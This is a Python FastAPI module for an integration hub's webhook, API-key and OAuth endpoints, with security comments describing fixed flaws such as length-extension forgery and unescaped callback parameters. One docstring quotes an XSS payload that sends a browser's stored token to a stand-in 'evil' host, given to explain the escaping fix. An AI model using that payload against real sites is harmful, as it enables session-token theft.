"""
api/v1/integrations.py — Integration Hub Endpoints (L1–L3)

POST   /integrations                       ← Register integration (webhook or API key)
GET    /integrations                       ← List all for user
GET    /integrations/{id}                  ← Single integration details
DELETE /integrations/{id}                  ← Disconnect
POST   /integrations/inbound/{id}          ← Inbound webhook from external platform
GET    /integrations/oauth/{platform}      ← Get OAuth redirect URL (L2/L3)
GET    /integrations/oauth/callback        ← OAuth callback handler (L2/L3)
"""

from datetime import datetime, timezone
from fastapi import APIRouter, Depends, HTTPException, Request
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from app.auth.dependencies import get_current_user
from app.database import get_supabase, q
from app.core.integrations.normalizers.crm import normalize_crm_event
from app.core.integrations.normalizers.marketing import normalize_marketing_event
from app.core.constants import VALID_MODULES
from app.core.rate_limit import check_rate_limit
from app.config import settings
from app.core.intelligence.reward_engine import record_event
import secrets
import hashlib
import hmac
import html
import json
import logging
import os
from secrets import token_urlsafe, token_hex

logger = logging.getLogger(__name__)
router = APIRouter()


# ── Schemas ────────────────────────────────────────────────────────────────

class IntegrationCreate(BaseModel):
    module: str                    # 'crm' | 'marketing' | 'shield' | 'website'
    platform: str                  # 'custom' | 'webhook' | 'zoho' | ...
    label: str | None = None
    type: str = "webhook"          # 'webhook' | 'api_key' | 'oauth'


class OAuthInitRequest(BaseModel):
    module: str = "crm"
    client_id: str | None = None
    client_secret: str | None = None


# ── Helpers ────────────────────────────────────────────────────────────────

def generate_api_key() -> tuple[str, str, str]:
    """Returns (raw_key, prefix, key_hash)"""
    raw = "no_live_" + secrets.token_urlsafe(32)
    prefix = raw[:16]
    key_hash = hashlib.sha256(raw.encode()).hexdigest()
    return raw, prefix, key_hash


def generate_webhook_secret() -> str:
    return secrets.token_hex(32)


# ── Routes ────────────────────────────────────────────────────────────────

@router.post("", status_code=201)
async def create_integration(
    body: IntegrationCreate,
    current_user: dict = Depends(get_current_user),
):
    """Register a new integration. Returns webhook URL or API key based on type."""
    if body.module not in VALID_MODULES:
        raise HTTPException(
            status_code=400,
            detail=f"Invalid module '{body.module}'. Valid: {sorted(VALID_MODULES)}",
        )

    user_id = current_user["sub"]
    db = get_supabase()

    webhook_secret = generate_webhook_secret()
    label = body.label or f"{body.module.upper()} {body.type.replace('_', ' ').title()}"

    try:
        result = await q(db.table("integrations").insert({
            "user_id":        user_id,
            "module":         body.module,
            "platform":       body.platform,
            "type":           body.type,
            "label":          label,
            "status":         "active",
            "webhook_secret": webhook_secret,
            "config":         {"label": label},
        }))

        if not result.data:
            raise HTTPException(status_code=500, detail="Failed to create integration")

        integration = result.data[0]
        response = {"integration": integration}

        # If type is api_key — also generate one and attach to response
        if body.type == "api_key":
            raw_key, prefix, key_hash = generate_api_key()
            await q(db.table("integration_api_keys").insert({
                "user_id":        user_id,
                "integration_id": integration["id"],
                "key_prefix":     prefix,
                "key_hash":       key_hash,
                "label":          label,
                "is_active":      True,
            }))
            # Return raw key ONCE — never stored in plaintext
            integration["api_key"] = raw_key

        logger.info(
            f"[Integrations] Created {body.type} — "
            f"module={body.module} platform={body.platform} user={user_id[:8]}"
        )
        return response

    except Exception as e:
        logger.error(f"[Integrations] Create failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("")
async def list_integrations(current_user: dict = Depends(get_current_user)):
    """List all integrations for the current user."""
    user_id = current_user["sub"]
    db = get_supabase()

    try:
        result = (
            await q(db.table("integrations")
            .select("id, module, platform, type, label, status, config, last_sync_at, created_at")
            .eq("user_id", user_id)
            .eq("status", "active")
            .order("created_at", desc=True))
        )
        return {"integrations": result.data or []}
    except Exception as e:
        logger.error(f"[Integrations] List failed: {e}")
        return {"integrations": []}


@router.get("/{integration_id}")
async def get_integration(
    integration_id: str,
    current_user: dict = Depends(get_current_user),
):
    """Get a single integration's details."""
    user_id = current_user["sub"]
    db = get_supabase()

    result = (
        await q(db.table("integrations")
        .select("*")
        .eq("id", integration_id)
        .eq("user_id", user_id))
    )

    if not result.data:
        raise HTTPException(status_code=404, detail="Integration not found")

    return {"integration": result.data[0]}


@router.delete("/{integration_id}", status_code=204)
async def delete_integration(
    integration_id: str,
    current_user: dict = Depends(get_current_user),
):
    """Disconnect / remove an integration."""
    user_id = current_user["sub"]
    db = get_supabase()

    result = (
        await q(db.table("integrations")
        .update({"status": "disconnected"})
        .eq("id", integration_id)
        .eq("user_id", user_id))
    )

    if not result.data:
        raise HTTPException(status_code=404, detail="Integration not found")

    logger.info(f"[Integrations] Disconnected {integration_id[:8]} user={user_id[:8]}")


@router.post("/inbound/{integration_id}")
async def receive_inbound_webhook(
    integration_id: str,
    request: Request,
):
    """
    Receive inbound webhook data from an external platform.
    Validates HMAC signature, logs raw payload, then normalizes to events table.
    No auth required here — validated via webhook secret.
    """
    db = get_supabase()

    # Fetch integration (no user auth — use service role)
    int_result = (
        await q(db.table("integrations")
        .select("id, user_id, module, platform, webhook_secret, status")
        .eq("id", integration_id)
        .eq("status", "active"))
    )

    if not int_result.data:
        raise HTTPException(status_code=404, detail="Integration not found or inactive")

    integration = int_result.data[0]
    user_id = integration["user_id"]
    module = integration["module"]
    platform = integration["platform"]

    check_rate_limit(f"webhook:{integration_id}", max_calls=30, window_seconds=60)

    # Get raw body
    body_bytes = await request.body()
    try:
        payload = await request.json()
    except Exception:
        payload = {"raw": body_bytes.decode(errors="replace")}

    # ── HMAC validation ─────────────────────────────────────────
    # SECURITY FIX: previously this only rejected a *wrong* signature —
    # omitting the header entirely skipped verification altogether, letting
    # anyone who knew (or enumerated) an integration_id inject fabricated
    # events for that tenant. A signature is now always required.
    sig_header = request.headers.get("X-NeuralOrbit-Signature", "")

    # SECURITY: this must be HMAC, not SHA256(secret ‖ message).
    # The old construction was the textbook Merkle-Damgard length-extension
    # shape: an attacker holding ONE valid (body, signature) pair — from a
    # proxy log, a third-party relay, a CI log — could forge a signature for
    # `body ‖ padding ‖ suffix` without ever knowing the secret. The forged
    # body fails JSON parsing, but the handler falls back to {"raw": ...} and
    # still writes an event into that tenant.
    # Also: hash the RAW BYTES. The old code hashed
    # body_bytes.decode(errors="replace"), which lossily mangles any non-UTF-8
    # byte before hashing, so a legitimate sender using a different encoding
    # could never produce a matching signature.
    expected = hmac.new(
        integration["webhook_secret"].encode(),
        body_bytes,
        hashlib.sha256,
    ).hexdigest()

    if not sig_header or not secrets.compare_digest(sig_header, expected):
        logger.warning(f"[Webhook] Missing or invalid signature for integration {integration_id[:8]}")
        raise HTTPException(status_code=401, detail="Invalid webhook signature")

    # ── Store raw event ─────────────────────────────────────────
    await q(db.table("raw_integration_events").insert({
        "integration_id": integration_id,
        "user_id":        user_id,
        "platform":       platform,
        "raw_payload":    payload,
        "normalized":     False,
    }))

    # ── Normalize to events table ───────────────────────────────
    # Use platform-specific normalizers (L2/L3) or generic fallback
    try:
        if module == "crm" and platform in ("zoho", "hubspot"):
            normalized_events = normalize_crm_event(platform, payload)
        elif module == "marketing" and platform in ("meta_ads", "google_ads"):
            normalized_events = normalize_marketing_event(platform, payload)
        else:
            # Generic fallback — use event_type from payload
            event_type = payload.get("event_type", "webhook_received")
            normalized_events = [{
                "event_type"  : event_type,
                "reward_value": 1.0,
                "payload"     : payload.get("payload", payload),
                "source"      : "webhook",
            }]

        # Route through the shared pipeline so webhook traffic writes `rewards`
        # rows and updates module_states.cumulative_reward. This previously
        # inserted into `events` and stopped, so a customer whose data arrives
        # by webhook showed cumulative_reward = 0 and the LLM reasoned about
        # them as if they had generated nothing.
        # The normalizer's reward_value becomes the FALLBACK; reward_config
        # wins when it has a matching row.
        for ne in normalized_events:
            await record_event(
                user_id       = user_id,
                module        = module,
                event_type    = ne["event_type"],
                payload       = ne.get("payload", {}),
                source        = ne.get("source", "webhook"),
                default_reward= ne.get("reward_value", 1.0),
            )

        # Update last_sync_at
        await q(db.table("integrations").update(
            {"last_sync_at": datetime.now(timezone.utc).isoformat()}
        ).eq("id", integration_id))

        logger.info(
            f"[Webhook] Normalized {len(normalized_events)} events — "
            f"module={module} platform={platform} integration={integration_id[:8]}"
        )
    except Exception as e:
        logger.error(f"[Webhook] Normalization failed: {e}")
        await q(db.table("raw_integration_events").update({"error": str(e)}).eq(
            "integration_id", integration_id
        ))

    return {"status": "ok", "events_created": len(normalized_events) if 'normalized_events' in dir() else 0}


# ── OAuth Routes (L2 / L3) ────────────────────────────────────────────────

# OAuth config — reads from .env at request time (NOT at import time)
# This ensures python-dotenv values are picked up correctly.
def _get_oauth_config(platform: str) -> dict | None:
    """Return OAuth config for a platform, reading from pydantic settings."""
    from app.config import get_settings
    s = get_settings()
    configs = {
        "zoho": {
            "auth_url"    : "https://accounts.zoho.com/oauth/v2/auth",
            "client_id"   : s.ZOHO_CLIENT_ID,
            "scope"       : "ZohoCRM.modules.ALL,ZohoCRM.settings.ALL",
            "redirect_uri": s.OAUTH_REDIRECT_URI,
        },
        "hubspot": {
            "auth_url"    : "https://app.hubspot.com/oauth/authorize",
            "client_id"   : s.HUBSPOT_CLIENT_ID,
            "scope"       : "crm.objects.contacts.read crm.objects.deals.read",
            "redirect_uri": s.OAUTH_REDIRECT_URI,
        },
        "meta_ads": {
            "auth_url"    : "https://www.facebook.com/v18.0/dialog/oauth",
            "client_id"   : s.META_APP_ID,
            "scope"       : "ads_read,ads_management,pages_read_engagement",
            "redirect_uri": s.OAUTH_REDIRECT_URI,
        },
        "google_ads": {
            "auth_url"    : "https://accounts.google.com/o/oauth2/v2/auth",
            "client_id"   : s.GOOGLE_CLIENT_ID,
            "scope"       : "https://www.googleapis.com/auth/adwords",
            "redirect_uri": s.OAUTH_REDIRECT_URI,
        },
    }
    # Allow override client_id from user if provided (Marketing platforms)
    conf = configs.get(platform)
    return conf


# In-memory state store: state_hash → {user_id, module, platform}
# Short-lived — lost on server restart, fine (user just re-clicks Connect)
_oauth_state_store: dict[str, dict] = {}


@router.get("/oauth/callback", response_class=HTMLResponse)
async def oauth_callback(
    code: str = "",
    state: str = "",
    error: str = "",
    error_description: str = "",
):
    """
    L2/L3 — Real OAuth callback handler.
    Exchanges authorization code for access + refresh tokens and stores per user.
    NOTE: This route MUST be registered before /oauth/{platform} to avoid shadowing.
    """
    if error:
        logger.warning(f"[OAuth Callback] Error from platform: {error} — {error_description}")
        return _oauth_page(False, "Authorization Error", error_description or error, state)

    # Validate state — retrieve user context
    ctx = _oauth_state_store.pop(state, None)
    if not ctx:
        logger.warning(f"[OAuth Callback] Unknown/expired state: {state[:12]}")
        return _oauth_page(False, "Session Expired", "OAuth session expired. Please try connecting again.", state)

    user_id  = ctx["user_id"]
    module   = ctx["module"]
    platform = ctx["platform"]

    if not code:
        return _oauth_page(False, "No Code Received", "No authorization code returned by the platform.", state)

    # Exchange code for tokens (using custom creds from state if they exist)
    from app.core.integrations.oauth_handler import exchange_code_for_tokens, store_oauth_tokens
    token_data = await exchange_code_for_tokens(
        platform, 
        code, 
        custom_client_id=ctx.get("client_id"),
        custom_client_secret=ctx.get("client_secret")
    )

    if not token_data or "access_token" not in token_data:
        logger.error(f"[OAuth Callback] Token exchange failed for {platform}: {token_data}")
        return _oauth_page(False, "Connection Failed", f"Could not get access token from {platform.title()}. Check backend logs.", state)

    # Store tokens per user in integrations table
    integration_id = await store_oauth_tokens(
        user_id=user_id, 
        module=module, 
        platform=platform, 
        token_data=token_data,
        custom_client_id=ctx.get("client_id"),
        custom_client_secret=ctx.get("client_secret")
    )

    logger.info(f"[OAuth] ✓ {platform} connected — user={user_id[:8]} integration={str(integration_id)[:8]}")
    return _oauth_page(True, f"{platform.replace('_',' ').title()} Connected!", "Your account is connected. This window will close.", state)



@router.post("/oauth/{platform}/init")
async def get_oauth_url(
    platform: str,
    req: OAuthInitRequest,
    current_user: dict = Depends(get_current_user),
):
    """
    L2/L3 — Generate OAuth redirect URL for a platform.
    Now supports user-provided client_id and client_secret.
    """
    cfg = _get_oauth_config(platform)
    if not cfg:
        raise HTTPException(status_code=400, detail=f"OAuth not configured for: {platform}")

    # Use user-provided or fallback to system
    client_id = req.client_id or cfg["client_id"]
    client_secret = req.client_secret or cfg.get("client_secret") # Note: cfg might not have secret if not in .env

    if not client_id:
        return {
            "status"    : "not_configured",
            "message"   : f"Enter your {platform.upper()} app credentials to enable OAuth.",
            "platform"  : platform
        }

    # Build unique state token
    state = hashlib.sha256(
        f"{current_user['sub']}:{req.module}:{platform}:{secrets.token_hex(8)}".encode()
    ).hexdigest()[:32]

    _oauth_state_store[state] = {
        "user_id" : current_user["sub"],
        "module"  : req.module,
        "platform": platform,
        "client_id": client_id,
        "client_secret": client_secret
    }

    from urllib.parse import urlencode
    params = {
        "client_id"    : client_id,
        "redirect_uri" : cfg["redirect_uri"],
        "scope"        : cfg["scope"],
        "response_type": "code",
        "state"        : state,
        "access_type"  : "offline",
    }
    if platform == "zoho":
        params["prompt"] = "consent"

    url = cfg["auth_url"] + "?" + urlencode(params)
    return {"oauth_url": url, "platform": platform, "state": state}




def _oauth_page(success: bool, title: str, message: str, state: str) -> HTMLResponse:
    """
    SECURITY: every interpolated value below is attacker-reachable. `title`,
    `message`, and `state` are built from OAuth callback query params
    (`error`, `error_description`, `state`), and the failure path renders them
    for ANY unauthenticated request with an unrecognised state — so this page
    is reachable without credentials.

    Two different contexts, two different escapes:
      * HTML text  -> html.escape()  (&, <, >, and quotes)
      * JS string  -> json.dumps()   (emits its own quotes, escapes ' " \\ and
                                      newlines; also escapes </script>-breaking
                                      sequences when combined with the escape
                                      of '<' below)
    Interpolating raw values here previously allowed:
        ?state=';fetch('//evil/'+localStorage.token);//
    to execute on the backend origin with no auth at all.
    """
    color = "#22C55E" if success else "#EF4444"
    icon  = "&#10003;" if success else "&#10007;"

    safe_title   = html.escape(title or "")
    safe_message = html.escape(message or "")
    # json.dumps supplies the surrounding quotes; escaping '<' prevents a
    # literal "</script>" inside the value from terminating the script block.
    safe_state_js = json.dumps(state or "").replace("<", "\\u003c")
    success_js    = "true" if success else "false"

    # postMessage previously targeted '*', broadcasting the OAuth result to any
    # window that opened this popup. Target the configured dashboard origin
    # instead. In development APP_CORS_ORIGINS may be unset/wildcard, so fall
    # back to '*' only there — never in production.
    _origins = [o for o in settings.cors_origins_list if o and o != "*" and o != "null"]
    if _origins:
        dashboard_origin_js = json.dumps(_origins[0])
    elif settings.is_production:
        # Nothing usable configured in production: fail closed. "null" matches
        # no real origin, so the message is simply not delivered rather than
        # broadcast to whoever opened the popup.
        dashboard_origin_js = '"null"'
    else:
        dashboard_origin_js = '"*"'

    return HTMLResponse(f"""
    <!DOCTYPE html><html>
    <head>
        <title>NeuralOrbit — OAuth</title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
        <style>
            body{{margin:0;font-family:Inter,sans-serif;background:#0A0F1F;
                 display:flex;align-items:center;justify-content:center;height:100vh;}}
            .card{{text-align:center;padding:40px;max-width:320px;}}
            .icon{{font-size:48px;color:{color};margin-bottom:16px;}}
            h2{{color:{color};font-size:20px;margin:0 0 12px;font-weight:600;}}
            p{{color:#94A3B8;font-size:14px;line-height:1.6;margin:0;}}
            .bar{{width:100%;height:3px;background:{color}30;border-radius:2px;margin-top:24px;overflow:hidden;}}
            .bar-fill{{width:0;height:100%;background:{color};animation:fill 2.2s linear forwards;}}
            @keyframes fill{{to{{width:100%;}}}}
        </style>
    </head>
    <body>
        <div class="card">
            <div class="icon">{icon}</div>
            <h2>{safe_title}</h2>
            <p>{safe_message}</p>
            <div class="bar"><div class="bar-fill"></div></div>
        </div>
        <script>
            if(window.opener){{
                window.opener.postMessage({{type:'oauth_success',success:{success_js},state:{safe_state_js}}}, {dashboard_origin_js});
            }}
            setTimeout(()=>window.close(), 2300);
        </script>
    </body></html>
    """)


# ── Sync Trigger Endpoint ─────────────────────────────────────────────────────
# Appended safely — no existing routes changed above this line.

@router.post("/{integration_id}/sync")
async def sync_integration(
    integration_id: str,
    current_user: dict = Depends(get_current_user),
):
    """
    Trigger a manual data sync for a connected integration.
    Routes to the correct sync worker based on platform type.
    Returns: { synced, errors, platform }
    """
    from app.core.integrations.crm_sync import run_crm_sync

    user_id = current_user["sub"]
    db = get_supabase()

    # Fetch the integration (scoped to user for security)
    result = (
        await q(db.table("integrations")
        .select("id, module, platform, config, status")
        .eq("id", integration_id)
        .eq("user_id", user_id)
        .eq("status", "active"))
    )

    if not result.data:
        raise HTTPException(status_code=404, detail="Integration not found or inactive.")

    integration = result.data[0]
    module = integration.get("module", "")

    try:
        if module == "crm":
            sync_result = await run_crm_sync(user_id, integration)
        else:
            # Future: marketing_sync, shield_sync, etc.
            sync_result = {
                "synced": 0,
                "errors": 0,
                "platform": integration.get("platform"),
                "note": f"Sync not yet implemented for module: {module}"
            }

        logger.info(
            f"[Sync] {module}/{integration.get('platform')} "
            f"— user={user_id[:8]} synced={sync_result.get('synced', 0)}"
        )
        return sync_result

    except Exception as e:
        logger.error(f"[Sync] Failed for integration={integration_id[:8]}: {e}")
        raise HTTPException(status_code=500, detail=f"Sync failed: {str(e)}")
